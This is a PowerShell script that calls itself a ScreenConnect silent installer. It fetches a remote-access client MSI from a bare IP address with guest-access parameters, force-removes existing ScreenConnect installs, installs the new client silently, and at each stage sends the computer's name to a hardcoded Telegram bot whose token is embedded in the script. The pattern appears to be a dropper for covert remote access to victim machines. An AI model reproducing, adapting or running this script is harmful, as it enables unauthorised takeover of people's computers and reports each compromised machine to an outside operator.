# ==============================================================================
# Script Name: install.ps1
# Description: Fixed ScreenConnect silent installer with UTF-8 Telegram fix
# ==============================================================================

# Force PowerShell output to treat text as UTF-8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

# 1. TELEGRAM CONFIGURATION
$BotToken = "8804791627:AAG1vTmc-HlAW8DR0gzKezeKidm4W3DwmXY"
$ChatID   = "6867549905"

# 2. APPLICATION CONFIGURATION
$MsiUrl    = "http://50.114.179.239/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$TempDir   = "C:\Windows\Temp"
$MsiPath   = Join-Path $TempDir "ScreenConnectSetup.msi"
$LogPath   = "C:\Windows\Temp\ScreenConnect_Install.log"
$Computer  = $env:COMPUTERNAME

$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

# Function to send Telegram messages safely via JSON POST
function Send-TelegramAlert {
    param([string]$Message)
    try {
        $Payload = @{
            chat_id = $ChatID
            text    = $Message
        } | ConvertTo-Json -Compress -Depth 2

        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
                          -Method Post `
                          -ContentType "application/json; charset=utf-8" `
                          -Body $Payload -ErrorAction Stop | Out-Null
    } catch {
        Write-Warning "Failed to send Telegram notification: $($_.Exception.Message)"
    }
}

# === MILESTONE 1: SCRIPT LAUNCHED (RESTORED) ===
Send-TelegramAlert -Message "[🚀] ScreenConnect Script Launched!`nPC: $Computer`nStatus: Starting system environmental pre-checks..."

# 3. ANTI-1603 CONFLICT CLEANUP (Runs before installation)
try {
    Write-Output "Stopping any existing ScreenConnect services..."
    Get-Service -Name "*ScreenConnect*" -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
    Get-Process -Name "*ScreenConnect*" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

    Write-Output "Removing old ScreenConnect instances to prevent 1603 errors..."
    Get-CimInstance -ClassName Win32_Product -Filter "Name LIKE '%ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
        Write-Output "Uninstalling existing client: $($_.Name)"
        # Instant alert if an existing installation conflict is actively being purged
        Send-TelegramAlert -Message "[🗑️] Conflict Found: Removing old client ($($_.Name)) on PC: $Computer"
        Invoke-CimMethod -InputObject $_ -MethodName "Uninstall" -ErrorAction SilentlyContinue
    }
} catch {
    Write-Output "Pre-cleanup encountered an issue but proceeding anyway: $_"
}

# === MILESTONE 2: DOWNLOAD INITIATED (RESTORED) ===
Send-TelegramAlert -Message "[📥] Download Started`nPC: $Computer`nStatus: Fetching the ScreenConnect setup package..."

# 4. Download Logic
try {
    Write-Output "Downloading ScreenConnect MSI..."
    if (Test-Path $MsiPath) { Remove-Item $MsiPath -Force -ErrorAction SilentlyContinue }

    Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiPath -UseBasicParsing -ErrorAction Stop

    if (-not (Test-Path $MsiPath) -or (Get-Item $MsiPath).Length -lt 1024) {
        throw "Downloaded file is missing or too small."
    }
    Write-Output "Download completed successfully."
}
catch {
    $Msg = "[!] ScreenConnect Download FAILED`nPC: $Computer`nError: $($_.Exception.Message)"
    Send-TelegramAlert -Message $Msg
    exit 1
}

# === MILESTONE 3: INSTALLATION STARTED (RESTORED) ===
Send-TelegramAlert -Message "[🛠️] Installation Started`nPC: $Computer`nStatus: Handing the MSI binary package to the silent background execution engine..."

# 5. Installation Logic
if (Test-Path $MsiPath) {
    Write-Output "Starting silent installation..."
    $Arguments = "/i `"$MsiPath`" /qn /norestart /L*V `"$LogPath`""

    $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Wait -NoNewWindow -PassThru

    Remove-Item -Path $MsiPath -Force -ErrorAction SilentlyContinue

    # === MILESTONE 4: FINAL EVALUATION ===
    if ($Process.ExitCode -eq 0 -or $Process.ExitCode -eq 3010) {
        $Status = if ($Process.ExitCode -eq 3010) { "Installed successfully (Reboot Pending)." } else { "Installed successfully." }
        $Msg = "[+] ScreenConnect Deployment Success`nPC: $Computer`nStatus: $Status"
        Send-TelegramAlert -Message $Msg
        exit 0
    }
    else {
        $Msg = "[!] ScreenConnect Deployment FAILED`nPC: $Computer`nExit Code: $($Process.ExitCode)`nCheck local log at: $LogPath"
        Send-TelegramAlert -Message $Msg
        exit $Process.ExitCode
    }
} else {
    $Msg = "[!] ScreenConnect Deployment FAILED`nPC: $Computer`nError: File download validation failed."
    Send-TelegramAlert -Message $Msg
    exit 1
}
